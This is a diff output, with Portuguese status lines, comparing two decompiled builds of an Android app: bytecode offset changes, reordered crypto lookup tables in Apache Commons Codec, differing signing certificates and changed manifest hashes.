+>     //   599: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   602: aload_0
+>     //   603: aload 7
+>     //   605: getfield 386	fm/flycast/DPXMLTrack:addart	Ljava/lang/String;
+>     //   608: aload 6
+>     //   610: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   613: aload_0
+>     //   614: aload 7
+>     //   616: getfield 389	fm/flycast/DPXMLTrack:adurl	Ljava/lang/String;
+>     //   619: aload 6
+>     //   621: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   624: aload 6
+>     //   626: aload 7
+>     //   628: getfield 392	fm/flycast/DPXMLTrack:synced	Z
+>     //   631: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   634: aload 6
+>     //   636: aload 7
+>     //   638: getfield 395	fm/flycast/DPXMLTrack:syncoff	I
+>     //   641: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   644: goto +211 -> 855
+>     //   647: aload_1
+>     //   648: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+>     //   651: iload_2
+>     //   652: invokevirtual 463	java/util/Vector:remove	(I)Ljava/lang/Object;
+>     //   655: pop
+>     //   656: goto +199 -> 855
+>     //   659: astore_1
+>     //   660: aload 6
+>     //   662: astore 7
+>     //   664: aload 5
+>     //   666: astore 6
+>     //   668: getstatic 96	java/lang/System:err	Ljava/io/PrintStream;
+>     //   671: new 29	java/lang/StringBuilder
+>     //   674: dup
+>     //   675: invokespecial 30	java/lang/StringBuilder:<init>	()V
+>     //   678: getstatic 99	fm/flycast/DPStringConstants:STR_EXCEPTION	Ljava/lang/String;
+>     //   681: invokevirtual 39	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
+>     //   684: ldc_w 465
+>     //   687: invokevirtual 39	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
+>     //   690: aload_1
+>     //   691: invokevirtual 104	java/lang/Exception:getMessage	()Ljava/lang/String;
+>     //   694: invokevirtual 39	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
+>     //   697: invokevirtual 43	java/lang/StringBuilder:toString	()Ljava/lang/String;
+>     //   700: invokevirtual 109	java/io/PrintStream:println	(Ljava/lang/String;)V
+>     //   703: new 467	java/lang/NullPointerException
+>     //   706: dup
+>     //   707: invokespecial 468	java/lang/NullPointerException:<init>	()V
+>     //   710: athrow
+>     //   711: aload 5
+>     //   713: invokevirtual 469	java/io/FileOutputStream:close	()V
+>     //   716: aload 6
+>     //   718: invokevirtual 470	java/io/DataOutputStream:close	()V
+>     //   721: aload_1
+>     //   722: areturn
+>     //   723: astore 5
+>     //   725: aload 5
+>     //   727: invokevirtual 471	java/io/IOException:printStackTrace	()V
+>     //   730: aload_1
+>     //   731: areturn
+>     //   732: astore_1
+>     //   733: aload_1
+>     //   734: invokevirtual 471	java/io/IOException:printStackTrace	()V
+>     //   737: aconst_null
+>     //   738: areturn
+>     //   739: astore 5
+>     //   741: aload 6
+>     //   743: astore_1
+>     //   744: aload_1
+>     //   745: invokevirtual 469	java/io/FileOutputStream:close	()V
+>     //   748: aload 7
+>     //   750: invokevirtual 470	java/io/DataOutputStream:close	()V
+>     //   753: aload 5
+>     //   755: athrow
+>     //   756: astore_1
+>     //   757: aload_1
+>     //   758: invokevirtual 471	java/io/IOException:printStackTrace	()V
+>     //   761: goto -8 -> 753
+>     //   764: astore 5
+>     //   766: aload 11
+>     //   768: astore_1
+>     //   769: aload 9
+>     //   771: astore 7
+>     //   773: goto -29 -> 744
+>     //   776: astore 6
+>     //   778: aload 5
+>     //   780: astore_1
+>     //   781: aload 9
+>     //   783: astore 7
+>     //   785: aload 6
+>     //   787: astore 5
+>     //   789: goto -45 -> 744
+>     //   792: astore 8
+>     //   794: aload 5
+>     //   796: astore_1
+>     //   797: aload 6
+>     //   799: astore 7
+>     //   801: aload 8
+>     //   803: astore 5
+>     //   805: goto -61 -> 744
+>     //   808: astore_1
+>     //   809: aload 10
+>     //   811: astore 5
+>     //   813: aload 8
+>     //   815: astore 7
+>     //   817: goto -153 -> 664
+>     //   820: astore_1
+>     //   821: aload 10
+>     //   823: astore 5
+>     //   825: aload 8
+>     //   827: astore 7
+>     //   829: goto -165 -> 664
+>     //   832: astore_1
+>     //   833: aload 8
+>     //   835: astore 7
+>     //   837: goto -173 -> 664
+>     //   840: astore 5
+>     //   842: goto -117 -> 725
+>     //   845: iload_3
+>     //   846: iconst_1
+>     //   847: iadd
+>     //   848: istore_3
+>     //   849: iload_2
+>     //   850: istore 4
+>     //   852: goto -715 -> 137
+>     //   855: iload_2
+>     //   856: iconst_1
+>     //   857: iadd
+>     //   858: istore_2
+>     //   859: goto -610 -> 249
+939,952c939,952
+<     //   0	860	0	this	DPFileHandler
+<     //   0	860	1	paramDPXMLTracklist	DPXMLTracklist
+<     //   133	724	2	i	int
+<     //   135	712	3	j	int
+<     //   148	700	4	k	int
+<     //   94	616	5	localObject1	Object
+<     //   721	3	5	localIOException1	java.io.IOException
+<     //   737	15	5	localObject2	Object
+<     //   762	15	5	localObject3	Object
+<     //   785	37	5	localObject4	Object
+<     //   838	1	5	localIOException2	java.io.IOException
+<     //   31	709	6	localObject5	Object
+<     //   774	22	6	localObject6	Object
+<     //   22	812	7	localObject7	Object
+---
+>     //   0	862	0	this	DPFileHandler
+>     //   0	862	1	paramDPXMLTracklist	DPXMLTracklist
+>     //   150	709	2	i	int
+>     //   136	713	3	j	int
+>     //   133	718	4	k	int
+>     //   94	618	5	localObject1	Object
+>     //   723	3	5	localIOException1	java.io.IOException
+>     //   739	15	5	localObject2	Object
+>     //   764	15	5	localObject3	Object
+>     //   787	37	5	localObject4	Object
+>     //   840	1	5	localIOException2	java.io.IOException
+>     //   31	711	6	localObject5	Object
+>     //   776	22	6	localObject6	Object
+>     //   22	814	7	localObject7	Object
+954,957c954,957
+<     //   790	42	8	localObject9	Object
+<     //   25	755	9	localObject10	Object
+<     //   37	783	10	localObject11	Object
+<     //   34	731	11	localObject12	Object
+---
+>     //   792	42	8	localObject9	Object
+>     //   25	757	9	localObject10	Object
+>     //   37	785	10	localObject11	Object
+>     //   34	733	11	localObject12	Object
+960,982c960,982
+<     //   136	147	657	java/lang/Exception
+<     //   150	167	657	java/lang/Exception
+<     //   175	245	657	java/lang/Exception
+<     //   247	642	657	java/lang/Exception
+<     //   645	654	657	java/lang/Exception
+<     //   709	714	721	java/io/IOException
+<     //   701	709	730	java/io/IOException
+<     //   39	96	737	finally
+<     //   666	701	737	finally
+<     //   742	751	754	java/io/IOException
+<     //   96	110	762	finally
+<     //   110	121	762	finally
+<     //   121	132	774	finally
+<     //   136	147	790	finally
+<     //   150	167	790	finally
+<     //   175	245	790	finally
+<     //   247	642	790	finally
+<     //   645	654	790	finally
+<     //   39	96	806	java/lang/Exception
+<     //   96	110	818	java/lang/Exception
+<     //   110	121	818	java/lang/Exception
+<     //   121	132	830	java/lang/Exception
+<     //   714	719	838	java/io/IOException
+---
+>     //   137	148	659	java/lang/Exception
+>     //   151	168	659	java/lang/Exception
+>     //   176	247	659	java/lang/Exception
+>     //   249	644	659	java/lang/Exception
+>     //   647	656	659	java/lang/Exception
+>     //   711	716	723	java/io/IOException
+>     //   703	711	732	java/io/IOException
+>     //   39	96	739	finally
+>     //   668	703	739	finally
+>     //   744	753	756	java/io/IOException
+>     //   96	110	764	finally
+>     //   110	121	764	finally
+>     //   121	132	776	finally
+>     //   137	148	792	finally
+>     //   151	168	792	finally
+>     //   176	247	792	finally
+>     //   249	644	792	finally
+>     //   647	656	792	finally
+>     //   39	96	808	java/lang/Exception
+>     //   96	110	820	java/lang/Exception
+>     //   110	121	820	java/lang/Exception
+>     //   121	132	832	java/lang/Exception
+>     //   716	721	840	java/io/IOException
+diff -r result/APP_101/App_B_101/org/apache/commons/codec/digest/UnixCrypt.java result/APP_101/App_M_101/org/apache/commons/codec/digest/UnixCrypt.java
+20,24c20,22
+<     int[] arrayOfInt4 = { 0, 1048576, 256, 1048832, 8, 1048584, 264, 1048840, 4096, 1052672, 4352, 1052928, 4104, 1052680, 4360, 1052936, 67108864, 68157440, 67109120, 68157696, 67108872, 68157448, 67109128, 68157704, 67112960, 68161536, 67113216, 68161792, 67112968, 68161544, 67113224, 68161800, 131072, 1179648, 131328, 1179904, 131080, 1179656, 131336, 1179912, 135168, 1183744, 135424, 1184000, 135176, 1183752, 135432, 1184008, 67239936, 68288512, 67240192, 68288768, 67239944, 68288520, 67240200, 68288776, 67244032, 68292608, 67244288, 68292864, 67244040, 68292616, 67244296, 68292872 };
+<     int[] arrayOfInt5 = { 0, 268435456, 65536, 268500992, 4, 268435460, 65540, 268500996, 536870912, 805306368, 536936448, 805371904, 536870916, 805306372, 536936452, 805371908, 1048576, 269484032, 1114112, 269549568, 1048580, 269484036, 1114116, 269549572, 537919488, 806354944, 537985024, 806420480, 537919492, 806354948, 537985028, 806420484, 4096, 268439552, 69632, 268505088, 4100, 268439556, 69636, 268505092, 536875008, 805310464, 536940544, 805376000, 536875012, 805310468, 536940548, 805376004, 1052672, 269488128, 1118208, 269553664, 1052676, 269488132, 1118212, 269553668, 537923584, 806359040, 537989120, 806424576, 537923588, 806359044, 537989124, 806424580 };
+<     int[] arrayOfInt6 = { 0, 256, 524288, 524544, 16777216, 16777472, 17301504, 17301760, 16, 272, 524304, 524560, 16777232, 16777488, 17301520, 17301776, 2097152, 2097408, 2621440, 2621696, 18874368, 18874624, 19398656, 19398912, 2097168, 2097424, 2621456, 2621712, 18874384, 18874640, 19398672, 19398928, 512, 768, 524800, 525056, 16777728, 16777984, 17302016, 17302272, 528, 784, 524816, 525072, 16777744, 16778000, 17302032, 17302288, 2097664, 2097920, 2621952, 2622208, 18874880, 18875136, 19399168, 19399424, 2097680, 2097936, 2621968, 2622224, 18874896, 18875152, 19399184, 19399440 };
+<     int[] arrayOfInt7 = { 0, 67108864, 262144, 67371008, 2, 67108866, 262146, 67371010, 8192, 67117056, 270336, 67379200, 8194, 67117058, 270338, 67379202, 32, 67108896, 262176, 67371040, 34, 67108898, 262178, 67371042, 8224, 67117088, 270368, 67379232, 8226, 67117090, 270370, 67379234, 2048, 67110912, 264192, 67373056, 2050, 67110914, 264194, 67373058, 10240, 67119104, 272384, 67381248, 10242, 67119106, 272386, 67381250, 2080, 67110944, 264224, 67373088, 2082, 67110946, 264226, 67373090, 10272, 67119136, 272416, 67381280, 10274, 67119138, 272418, 67381282 };
+<     SKB = new int[][] { arrayOfInt1, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt5, { 0, 134217728, 8, 134217736, 1024, 134218752, 1032, 134218760, 131072, 134348800, 131080, 134348808, 132096, 134349824, 132104, 134349832, 1, 134217729, 9, 134217737, 1025, 134218753, 1033, 134218761, 131073, 134348801, 131081, 134348809, 132097, 134349825, 132105, 134349833, 33554432, 167772160, 33554440, 167772168, 33555456, 167773184, 33555464, 167773192, 33685504, 167903232, 33685512, 167903240, 33686528, 167904256, 33686536, 167904264, 33554433, 167772161, 33554441, 167772169, 33555457, 167773185, 33555465, 167773193, 33685505, 167903233, 33685513, 167903241, 33686529, 167904257, 33686537, 167904265 }, arrayOfInt6, arrayOfInt7 };
+---
+>     int[] arrayOfInt4 = { 0, 134217728, 8, 134217736, 1024, 134218752, 1032, 134218760, 131072, 134348800, 131080, 134348808, 132096, 134349824, 132104, 134349832, 1, 134217729, 9, 134217737, 1025, 134218753, 1033, 134218761, 131073, 134348801, 131081, 134348809, 132097, 134349825, 132105, 134349833, 33554432, 167772160, 33554440, 167772168, 33555456, 167773184, 33555464, 167773192, 33685504, 167903232, 33685512, 167903240, 33686528, 167904256, 33686536, 167904264, 33554433, 167772161, 33554441, 167772169, 33555457, 167773185, 33555465, 167773193, 33685505, 167903233, 33685513, 167903241, 33686529, 167904257, 33686537, 167904265 };
+>     int[] arrayOfInt5 = { 0, 67108864, 262144, 67371008, 2, 67108866, 262146, 67371010, 8192, 67117056, 270336, 67379200, 8194, 67117058, 270338, 67379202, 32, 67108896, 262176, 67371040, 34, 67108898, 262178, 67371042, 8224, 67117088, 270368, 67379232, 8226, 67117090, 270370, 67379234, 2048, 67110912, 264192, 67373056, 2050, 67110914, 264194, 67373058, 10240, 67119104, 272384, 67381248, 10242, 67119106, 272386, 67381250, 2080, 67110944, 264224, 67373088, 2082, 67110946, 264226, 67373090, 10272, 67119136, 272416, 67381280, 10274, 67119138, 272418, 67381282 };
+>     SKB = new int[][] { arrayOfInt1, arrayOfInt2, arrayOfInt3, { 0, 1048576, 256, 1048832, 8, 1048584, 264, 1048840, 4096, 1052672, 4352, 1052928, 4104, 1052680, 4360, 1052936, 67108864, 68157440, 67109120, 68157696, 67108872, 68157448, 67109128, 68157704, 67112960, 68161536, 67113216, 68161792, 67112968, 68161544, 67113224, 68161800, 131072, 1179648, 131328, 1179904, 131080, 1179656, 131336, 1179912, 135168, 1183744, 135424, 1184000, 135176, 1183752, 135432, 1184008, 67239936, 68288512, 67240192, 68288768, 67239944, 68288520, 67240200, 68288776, 67244032, 68292608, 67244288, 68292864, 67244040, 68292616, 67244296, 68292872 }, { 0, 268435456, 65536, 268500992, 4, 268435460, 65540, 268500996, 536870912, 805306368, 536936448, 805371904, 536870916, 805306372, 536936452, 805371908, 1048576, 269484032, 1114112, 269549568, 1048580, 269484036, 1114116, 269549572, 537919488, 806354944, 537985024, 806420480, 537919492, 806354948, 537985028, 806420484, 4096, 268439552, 69632, 268505088, 4100, 268439556, 69636, 268505092, 536875008, 805310464, 536940544, 805376000, 536875012, 805310468, 536940548, 805376004, 1052672, 269488128, 1118208, 269553664, 1052676, 269488132, 1118212, 269553668, 537923584, 806359040, 537989120, 806424576, 537923588, 806359044, 537989124, 806424580 }, arrayOfInt4, { 0, 256, 524288, 524544, 16777216, 16777472, 17301504, 17301760, 16, 272, 524304, 524560, 16777232, 16777488, 17301520, 17301776, 2097152, 2097408, 2621440, 2621696, 18874368, 18874624, 19398656, 19398912, 2097168, 2097424, 2621456, 2621712, 18874384, 18874640, 19398672, 19398928, 512, 768, 524800, 525056, 16777728, 16777984, 17302016, 17302272, 528, 784, 524816, 525072, 16777744, 16778000, 17302032, 17302288, 2097664, 2097920, 2621952, 2622208, 18874880, 18875136, 19399168, 19399424, 2097680, 2097936, 2621968, 2622224, 18874896, 18875152, 19399184, 19399440 }, arrayOfInt5 };
+diff -r result/APP_101/App_B_101/org/apache/commons/codec/language/ColognePhonetic.java result/APP_101/App_M_101/org/apache/commons/codec/language/ColognePhonetic.java
+10,16c10
+<   private static final char[][] PREPROCESS_MAP;
+<   
+<   static
+<   {
+<     char[] arrayOfChar = { 214, 79 };
+<     PREPROCESS_MAP = new char[][] { { 196, 65 }, { 220, 85 }, arrayOfChar, { 223, 83 } };
+<   }
+---
+>   private static final char[][] PREPROCESS_MAP = { { 196, 65 }, { 220, 85 }, { 214, 79 }, { 223, 83 } };
+Os arquivos binários result/APP_101/App_B_101/original/AndroidManifest.xml e result/APP_101/App_M_101/original/AndroidManifest.xml são diferentes
+Somente em result/APP_101/App_B_101/original/META-INF: APPMOBI.DSA
+Somente em result/APP_101/App_B_101/original/META-INF: APPMOBI.SF
+Somente em result/APP_101/App_M_101/original/META-INF: CERT.RSA
+Somente em result/APP_101/App_M_101/original/META-INF: CERT.SF
+diff -r result/APP_101/App_B_101/original/META-INF/MANIFEST.MF result/APP_101/App_M_101/original/META-INF/MANIFEST.MF
+2c2,5
+< Created-By: 1.6.0_51 (Apple Inc.)
+---
+> Created-By: 1.0 (Android SignApk)
+> 
+> Name: res/drawable-ldpi/facebook_icon.png
+> SHA1-Digest: lPHIYoqZ+2OpY0LPumyDkUdNdoc=
+5c8,11
+< SHA1-Digest: OrnSVOfsU0fz7sCBTfkpCWSe3+4=
+---
+> SHA1-Digest: ew2Plp4UipABu4Hqs4z0yqlpSIE=
+> 
+> Name: res/raw/canvas_gl.js
+> SHA1-Digest: FM/rStDwHEhjlMH24qtrzx/25bU=
+8c14
+< SHA1-Digest: urMiNkHgibijfjQvnabezDJ1Wos=
+---
+> SHA1-Digest: OT4d9iPt4U3gN6jUIzZ1KgKl7sg=
+13,17c19,20
+< Name: res/raw/canvas_gl.js
+< SHA1-Digest: FM/rStDwHEhjlMH24qtrzx/25bU=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_russian.txt
+< SHA1-Digest: ln5mpI7m/dYz8po1m2pe5V1t//k=
+---
+> Name: res/layout/list_item.xml
+> SHA1-Digest: 42PF7/jj/9DuiqE7fs9RyIO+0P0=
+23,26c26
+< SHA1-Digest: ZRef+IcMp2wWmlujRsZAUSXNj/w=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_french.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+---
+> SHA1-Digest: n212bPozMPQRqjHWox3PvVxECZI=
+32c32
+< SHA1-Digest: W2R9cY+AkCEZmImXzNW4VsJjmEs=
+---
+> SHA1-Digest: 1ZGEe1AJYvBZRCp5iadPbwUF4So=
+35c35,38
+< SHA1-Digest: yqYT3oDMvBCnVyoRyNFtIe/nkdo=
+---
+> SHA1-Digest: U2AYxykwFAKHZSIW+el/eu2soec=
+> 
+> Name: res/layout-ldpi/capture.xml
+> SHA1-Digest: SjGEFWX1y+GnTPGDD9uTGXcEi/o=
+40,41c43,44
+< Name: org/apache/commons/codec/language/bm/ash_approx_romanian.txt
+< SHA1-Digest: 8dJCy93UqGPxUAM5qiwy8UeOCpA=
+---
+> Name: res/drawable-hdpi/facebook_icon.png
+> SHA1-Digest: V2LEVKYg2PFb0nYYOBnKjQliS/s=
+46,48d48
+< Name: org/apache/commons/codec/language/bm/gen_approx_hungarian.txt
+< SHA1-Digest: kpJ0pEDOyFBEu6wl4QdynsUq6jE=
+< 
+52,54d51
+< Name: org/apache/commons/codec/language/bm/gen_approx_arabic.txt
+< SHA1-Digest: 8LPDBpkhGMPrbgNH/3GMv5DW2Vs=
+< 
+58,60d54
+< Name: org/apache/commons/codec/language/bm/ash_exact_english.txt
+< SHA1-Digest: QN+UL/Br/fToWzAZVM6R8yBU8uA=
+< 
+64,68c58,59
+< Name: org/apache/commons/codec/language/bm/ash_rules_russian.txt
+< SHA1-Digest: T4ZqaaGytR6k0txV4R9HaAMRd8M=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_exact_approx_common.txt
+< SHA1-Digest: c9AqKhHVO0VPlbeLnJTrKdy/gSs=
+---
+> Name: res/drawable/rich_splash_port.png
+> SHA1-Digest: sEg3T25xyAD7ru7hq0KHahYuxsM=
+70,71c61,62
+< Name: org/apache/commons/codec/language/bm/sep_exact_hebrew.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+---
+> Name: assets/DirectCanvasSupport/ImpactPlugins/dc/animation.js
+> SHA1-Digest: aXRABZ1WKZoVtsl4x1SA0AGvuck=
+82,465d72
+< Name: res/drawable/service_notification.png
+< SHA1-Digest: TLZDf/EiHJL/5TukUG1wnhY6iDw=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_hebrew_common.txt
+< SHA1-Digest: pLUCmc4T/RjuklQ1aIULtSUwHKI=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_approx_english.txt
+< SHA1-Digest: WdrL/vp21NUtryKaVCYaAfnUY9U=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_approx_common.txt
+< SHA1-Digest: VLGwCVv3uxq8eYkWPr7gmtHLOnU=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_dutch.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_exact_french.txt
+< SHA1-Digest: FzpQ+GbWmzaOeTszrpAHMAbmuII=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_spanish.txt
+< SHA1-Digest: v/X501bGOhAvKUt41xXerI3WFvE=
+< 
+< Name: res/layout/login.xml
+< SHA1-Digest: ovXlZ61sKjOBcKpZSCn7tjx2CLI=
+< 
+< Name: res/drawable-xhdpi/test_container_splash_screen_tablet.jpg
+< SHA1-Digest: tCthugYHsZrJAkT3G14Tr++wNcY=
+< 
+< Name: res/drawable/button_allow_press.png
+< SHA1-Digest: ko8x+f3Gw+sux/SUVyTO4xIOGlI=
+< 
+< Name: res/raw/canvas.js
+< SHA1-Digest: RbCZsqTUbW7iGjpWviz98LbNnZA=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_approx_russian.txt
+< SHA1-Digest: k/nguda0I1ot8kuzX5C5xNb+MhY=
+< 
+< Name: res/drawable/am_qr_reader_logo.png
+< SHA1-Digest: lxqILMTEYVEMBlIVxbDsTibE1LY=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_approx_any.txt
+< SHA1-Digest: 54nb4ON7/wkHOr32PrSKqoszAGk=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_exact_french.txt
+< SHA1-Digest: QN+UL/Br/fToWzAZVM6R8yBU8uA=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_rules_french.txt
+< SHA1-Digest: B8soq3ODQdgyws77pmFOVzo66uI=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_exact_common.txt
+< SHA1-Digest: 4KUii83+gs6HZqsqdVTJKWmbKLE=
+< 
+< Name: res/raw/box2d.js
+< SHA1-Digest: ffOyAsC8n8bi1LEAGy0rsXn6dzU=
+< 
+< Name: res/raw/appmobicloud.js
+< SHA1-Digest: ewjHeX1zYkwSY4R3p6FDjGujxTE=
+< 
+< Name: res/layout/main_hvga_p.xml
+< SHA1-Digest: dvOE1Ln1jT2nNZp5/2qqL6htczM=
+< 
+< Name: res/raw/admobimgr.js
+< SHA1-Digest: DXfu2CAUgfDApW05kMdEMg4Qims=
+< 
+< Name: res/drawable/share_via_barcode.png
+< SHA1-Digest: EnsnpDRevp5lBWje24sfD/LpVt0=
+< 
+< Name: res/drawable/go_back.png
+< SHA1-Digest: kgEE+PzgzmHS3ZuPSaU5wPY+SqA=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_greeklatin.txt
+< SHA1-Digest: T0MDehullcH0uAY9slGJMUAhTkQ=
+< 
+< Name: res/drawable/rich_splash_ipad_ls.png
+< SHA1-Digest: AHqpojHYZD3ccnu46ipm2hLUiQk=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_approx_cyrillic.txt
+< SHA1-Digest: zhdfuG3lpctSYxuUJ7xTMIjSPNs=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_italian.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: res/layout/test_container_splash_tablet.xml
+< SHA1-Digest: +1FSk8rYQw2lZgzafIuiu3OC6Qo=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_rules_german.txt
+< SHA1-Digest: YO+2+bquWxcrjLHWD06sQ4ycQYc=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_rules_romanian.txt
+< SHA1-Digest: c2FG81GO6lTa5eTZpNvoIjKLPfw=
+< 
+< Name: res/drawable/spinner_w.png
+< SHA1-Digest: Pp3a2z5Hww2iC0ksC0bAELWIdAM=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_rules_english.txt
+< SHA1-Digest: xDM5Kj+RvDu2y5bXf+6seM3O0Ww=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_english.txt
+< SHA1-Digest: 00E7VR452tbgGSDvaN2vH71JXd0=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_polish.txt
+< SHA1-Digest: BKwAayJJNnmipd/rFV3jPkaErSE=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_turkish.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: res/drawable/remote_close.png
+< SHA1-Digest: LIhfHvOpGXsIF4qFRH1vxXCz5wk=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_hebrew.txt
+< SHA1-Digest: 80bIa465/ozUslfQBb84wPL42nY=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_rules_portuguese.txt
+< SHA1-Digest: sqGys16ESrXOXSg9obu8ix9O0DQ=
+< 
+< Name: res/raw/bookmarks.xml
+< SHA1-Digest: 0h9LouZMX8UVIzdSfBdFTzDolls=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_english.txt
+< SHA1-Digest: CHRv59odKbwWuNzWNtwmYNxOEH4=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_german.txt
+< SHA1-Digest: 3GlHgMBkvi2mEoFnPYxoBXIh4No=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_approx_german.txt
+< SHA1-Digest: MxrOjj0j10k/YbNQybQuDJBum3c=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_spanish.txt
+< SHA1-Digest: lGrj01vFVhIZq42vqijMqqlw+eo=
+< 
+< Name: res/drawable-ldpi/close.png
+< SHA1-Digest: lg0izCnB1flsd2QqLisbxkcuGyU=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_polish.txt
+< SHA1-Digest: C2oXvKtemOA5+wbuURYYZrRXawk=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_exact_any.txt
+< SHA1-Digest: 31+z+V5I9I/BsRgZo688C7Nmz5c=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_greek.txt
+< SHA1-Digest: KmHuQHLS9h1anGqkGCPCCtXC9QI=
+< 
+< Name: res/layout/test_container_splash.xml
+< SHA1-Digest: R0qHK+9U9pbZ0xa727BH5yXQr+U=
+< 
+< Name: res/layout/payment.xml
+< SHA1-Digest: i9yo9P3ytKOq496EzuCL7K66+30=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_exact_any.txt
+< SHA1-Digest: jWl5fcYklf5KZQOVQOhWuWwoUAM=
+< 
+< Name: res/raw/paybundle.zip
+< SHA1-Digest: ScDtAxN0hvnydIDvVFCySIzqVhw=
+< 
+< Name: res/layout/network.xml
+< SHA1-Digest: M1YwAtKyU/ttSMMvdDHyUC8qgV8=
+< 
+< Name: res/drawable/installing_spinner_7.png
+< SHA1-Digest: AL05aGoV7MTZ2k1TVnbc7ARtGhs=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_german.txt
+< SHA1-Digest: 0/CejklscQ18lQIcpLZ4h2ZwsQ0=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_greeklatin.txt
+< SHA1-Digest: KM44dvGlJjA1G1+QMxAorjQfVZo=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_english.txt
+< SHA1-Digest: WdrL/vp21NUtryKaVCYaAfnUY9U=
+< 
+< Name: res/drawable-xhdpi/launch_icon.png
+< SHA1-Digest: rqrmpS530IRsMsYyDgCUaTOJsC8=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_exact_polish.txt
+< SHA1-Digest: YtjlwefN2I0RWdC2euL3eS1iTgQ=
+< 
+< Name: res/drawable-mdpi/icon.png
+< SHA1-Digest: Lw/SqxqQxDgeX1jWQ7pEzoJ873E=
+< 
+< Name: res/drawable/fav_button.png
+< SHA1-Digest: PDdHLEGY3KKqD0vtYqdQLsCwXws=
+< 
+< Name: assets/DirectCanvasSupport/ImpactPlugins/dc/background-map.js
+< SHA1-Digest: 3sCpun7EWMx2NhMwchHHKbUlWX4=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_exact_cyrillic.txt
+< SHA1-Digest: QN+UL/Br/fToWzAZVM6R8yBU8uA=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_russian.txt
+< SHA1-Digest: i18jgMcJnz+/whRVChudyvXR6bQ=
+< 
+< Name: res/drawable/play_button.png
+< SHA1-Digest: RXs6+/4UWii1ErpeVDU/+PinBII=
+< 
+< Name: org/apache/commons/codec/language/bm/ash_languages.txt
+< SHA1-Digest: x5ijgzijaJwexI8tGvYq1Ys8W0o=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_approx_any.txt
+< SHA1-Digest: 5FHNYWkE/iE9uhTrfBSWz2fh4rI=
+< 
+< Name: org/apache/commons/codec/language/bm/gen_rules_turkish.txt
+< SHA1-Digest: rN+fxuizg39UWtnHiV1G1d2AaVY=
+< 
+< Name: res/drawable/rich_splash_ls.png
+< SHA1-Digest: 1+78HbiiLs8JyRK9X7cTSMtv47g=
+< 
+< Name: res/layout/bookmark_picker_list_item.xml
+< SHA1-Digest: Y3sAN2Bfvs/MxIzT1omeeU7BG9I=
+< 
+< Name: res/raw/onetouch_access_bg.jpg
+< SHA1-Digest: lHD6hYaCeSs85KlTkFQJ09WQWD0=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_exact_approx_common.txt
+< SHA1-Digest: 2wGOF99LQlKr0epBg2LDfgg5c/k=
+< 
+< Name: res/raw/bundle.zip
+< SHA1-Digest: tF4MRR01OyVpmT2a01cMIizN4NY=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_rules_any.txt
+< SHA1-Digest: tBhirNuraiANjlje0HNzz2Rd8XY=
+< 
+< Name: org/apache/commons/codec/language/bm/sep_rules_hebrew.txt
+< SHA1-Digest: G0Yn8vlBmcqKqvsNdi9pfDl8Mbs=
+< 
+< Name: res/drawable/timer_button.png
+< SHA1-Digest: zEUqVdofotdoudiHxgxbO116lrc=
+< 
+< Name: res/drawable/installing_spinner_4.png
+< SHA1-Digest: 93bJObTQFkz2lnEmuBAtHgS+BIk=
+< 
+< Name: com/appMobiCloud/license.txt.rtf
